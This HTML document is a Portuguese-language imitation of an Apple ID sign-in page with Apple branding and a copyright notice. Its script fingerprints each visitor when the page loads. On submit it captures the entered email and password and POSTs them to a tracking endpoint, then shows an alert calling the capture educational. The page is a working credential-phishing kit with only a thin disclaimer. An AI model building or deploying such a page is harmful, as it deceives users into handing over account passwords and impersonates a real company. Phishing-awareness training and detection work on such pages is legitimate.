<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJTNi40NzcgMjIgMTIgMjJTMjIgMTcuNTIzIDIyIDEyUzE3LjUyMyAyIDEyIDJaTTEyIDIwQzcuNTg5IDIwIDQgMTYuNDExIDQgMTJTNy41ODkgNCA1IDRTMjAgNy41ODkgMjAgMTJTMTYuNDExIDIwIDEyIDIwWiIgZmlsbD0iIzAwMCIvPgo8L3N2Zz4K">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f7;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .header {
            width: 100%;
            max-width: 980px;
            padding: 20px 0;
            text-align: center;
        }
        
        .apple-logo {
            width: 24px;
            height: 24px;
            fill: #1d1d1f;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 48px;
            width: 100%;
            max-width: 400px;
            margin-top: 40px;
        }
        
        .title {
            font-size: 32px;
            font-weight: 600;
            color: #1d1d1f;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 17px;
            color: #86868b;
            text-align: center;
            margin-bottom: 32px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 17px;
            color: #1d1d1f;
            margin-bottom: 8px;
            font-weight: 400;
        }
        
        .form-input {
            width: 100%;
            padding: 16px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 17px;
            background: #fff;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #007aff;
            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
        }
        
        .btn-primary {
            width: 100%;
            background: #007aff;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 400;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 20px;
        }
        
        .btn-primary:hover {
            background: #0056cc;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }
        
        .forgot-password a {
            color: #007aff;
            text-decoration: none;
            font-size: 17px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            text-align: center;
            margin: 32px 0;
            position: relative;
            color: #86868b;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #d2d2d7;
        }
        
        .divider span {
            background: white;
            padding: 0 16px;
        }
        
        .create-account {
            text-align: center;
        }
        
        .create-account a {
            color: #007aff;
            text-decoration: none;
            font-size: 17px;
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
            color: #86868b;
            font-size: 12px;
        }
        
        .footer a {
            color: #007aff;
            text-decoration: none;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
                margin-top: 20px;
            }
            
            .title {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <svg class="apple-logo" viewBox="0 0 24 24">
            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
        </svg>
    </div>
    
    <div class="container">
        <h1 class="title">Entrar</h1>
        <p class="subtitle">Use seu Apple ID para continuar</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label class="form-label" for="email">Apple ID</label>
                <input type="email" id="email" name="email" class="form-input" placeholder="nome@exemplo.com" required>
            </div>
            
            <div class="form-group">
                <label class="form-label" for="password">Senha</label>
                <input type="password" id="password" name="password" class="form-input" placeholder="Senha" required>
            </div>
            
            <button type="submit" class="btn-primary">Entrar</button>
        </form>
        
        <div class="forgot-password">
            <a href="#" onclick="return false;">Esqueceu o Apple ID ou a senha?</a>
        </div>
        
        <div class="divider">
            <span>ou</span>
        </div>
        
        <div class="create-account">
            <a href="#" onclick="return false;">Criar Apple ID</a>
        </div>
    </div>
    
    <div class="footer">
        <p>
            <a href="#" onclick="return false;">Privacidade</a> • 
            <a href="#" onclick="return false;">Termos de Uso</a> • 
            <a href="#" onclick="return false;">Suporte</a>
        </p>
        <p>Copyright © 2024 Apple Inc. Todos os direitos reservados.</p>
    </div>
    
    <script>
        // Coletar informações do visitante
        function collectVisitorInfo() {
            return {
                screen_resolution: screen.width + 'x' + screen.height,
                color_depth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                java_enabled: navigator.javaEnabled(),
                cookies_enabled: navigator.cookieEnabled,
                user_agent: navigator.userAgent,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            };
        }
        
        // Enviar informações para o servidor
        function sendVisitorInfo(additionalData = {}) {
            const visitorInfo = {
                ...collectVisitorInfo(),
                ...additionalData
            };
            
            fetch('/api/tracking/visit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(visitorInfo)
            }).catch(err => console.log('Tracking error:', err));
        }
        
        // Enviar informações na chegada
        sendVisitorInfo({
            action: 'page_load',
            page: 'apple_login'
        });
        
        // Capturar dados do formulário
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                action: 'form_submit',
                page: 'apple_login'
            };
            
            // Enviar dados capturados
            sendVisitorInfo({
                captured_data: formData
            });
            
            // Simular redirecionamento após um delay
            setTimeout(() => {
                alert('Dados capturados para fins educacionais. Esta é uma demonstração.');
            }, 1000);
        });
        
        // Rastrear cliques em links
        document.querySelectorAll('a').forEach(link => {
            link.addEventListener('click', function(e) {
                sendVisitorInfo({
                    action: 'link_click',
                    link_text: this.textContent,
                    page: 'apple_login'
                });
            });
        });
    </script>
</body>
</html>
